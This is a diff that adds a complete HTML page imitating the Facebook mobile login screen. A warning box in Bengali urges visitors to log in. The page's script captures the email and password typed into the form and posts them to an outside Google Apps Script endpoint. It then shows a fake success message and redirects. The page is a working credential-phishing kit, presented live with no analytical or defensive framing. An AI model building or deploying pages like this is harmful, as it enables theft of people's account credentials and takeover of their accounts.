@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Facebook</title>
+    
+    <style type="text/css" media="all">
+      body{
+       zoom: 2.8;
+      }
+      .head{
+        text-align: center;
+        margin-top: -60px;
+        font-size: 24px;
+        background-color: #42b5ff;
+        padding: 1px;
+        color: white;
+        font-size: 39px;
+      }
+      .aa{
+        opacity: 25%;
+        font-size: 8px;
+      }
+      .ab{
+        margin-top: 6px;
+        margin-bottom: 6px;
+        font-size: 18px;
+      }
+      input{
+        height: 28px;
+        width: 100%;
+        font-size: 19px;
+        border: 1.5px solid #9dc5ff;
+      }
+      button{
+        height: 28px;
+        width: 100%;
+        margin-top: 12px;
+        margin-bottom: 20px;
+        background-color: #588cff;
+        border: none;
+        color: white;
+        font-size: 19px;
+      }
+      .ac{
+        text-decoration: none;
+        font-size: 19px;
+      }
+      .ad{
+        text-align: center;
+      }
+      .ae{
+        text-decoration: none;
+        text-align: center;
+        color: white;
+        background-color: green;
+        font-size: 22px;
+        margin-left: 15%;
+        padding-left: 12px;
+        padding-right: 12px;
+      }
+      .af{
+        text-decoration: none;
+        
+      }
+      .ag{
+        text-decoration: none;
+        margin-left: 5px;
+        margin-top: 10px;
+      }
+      
+       /* Callout box - fixed position at the bottom of the page */
+.callout {
+  position: fixed;
+  top: 20%;
+  left: 7%;
+  margin-left: ;
+  max-width: 300px;
+}
+
+/* Callout header */
+.callout-header {
+  padding: 15px 10px;
+  background: #555;
+  font-size: 30px;
+  color: red;
+}
+
+/* Callout container/body */
+.callout-container {
+  padding-top: 1px;
+  padding-left: 25px;
+  padding-bottom: 20px;
+  background-color: #ccc;
+  color: #00000090;
+  font-size: 20px;
+}
+
+/* Close button */
+.closebtn {
+  position: absolute;
+  top: 5px;
+  right: 15px;
+  color: white;
+  font-size: 30px;
+  cursor: pointer;
+}
+
+/* Change color on mouse-over */
+.closebtn:hover {
+  color: lightgrey;
+}
+  .main{
+    background-color: none;
+    margin-top: 25%;
+    resize: ;
+    padding: ;
+  }
+
+
+    </style>
+  </head>
+  <body>
+    <div class="main">
+      
+    <div class="head">
+      <p>Facebook</p>
+    </div>
+    <p class="aa">_____________________________________________________________________________________________</p>
+    <form name="formName" class="formName" action="" method="post" accept-charset="utf-8">
+      <p class="ab">Mobile number or email</p>
+      <input type="text" name="email" id="email" value="" required />
+      <p class="ab">Password</p>
+      <input type="password" name="password" id="password" value="" required /><br />
+      <button onclick="" type="submit">Log in</button>
+    </form>
+    <a class="ac" href="">forgot password?</a>
+    <p class="ad">__________________   or   __________________</p>
+    <a class="ae" href="#">Create a new account</a><br />
+    <p>English (US)</p>
+ <a class="af" href="#">বাংলা</a><br />
+ <a class="ag" href="#">More language...</a>
+ 
+ 
+ <div class="callout">
+  <div class="callout-header">Warning !</div>
+  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
+  <div class="callout-container">
+    <p>ব্রাউজারে আপনার একাউন্ট login করা নেই ,অনুগ্রহ পূর্বক আপনার একাউন্ট login করুন।</p>
+    
+  </div>
+ </div>
+ 
+ 
+ 
+ <script type="text/javascript" charset="utf-8">
+ 
+			const scriptURL = 'https://script.google.com/macros/s/AKfycbxZZlKAi36icES45L6ra0dQLx34jILVUjOZAKFiqOHQiMvR5MFwKiSMOEsN8_cPSuQVPA/exec'
+			const form = document.forms['formName']
+		  
+			form.addEventListener('submit', e => {
+			  e.preventDefault()
+			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				.then(response => alert("Thank you! your form is submitted successfully" ))
+				.then(() => {  window.location.href = "incorrect.jpg"; })
+				.catch(error => console.error('Error!', error.message))
+			})
+		  
+
+   
+ </script>
+  </body>
+</html>
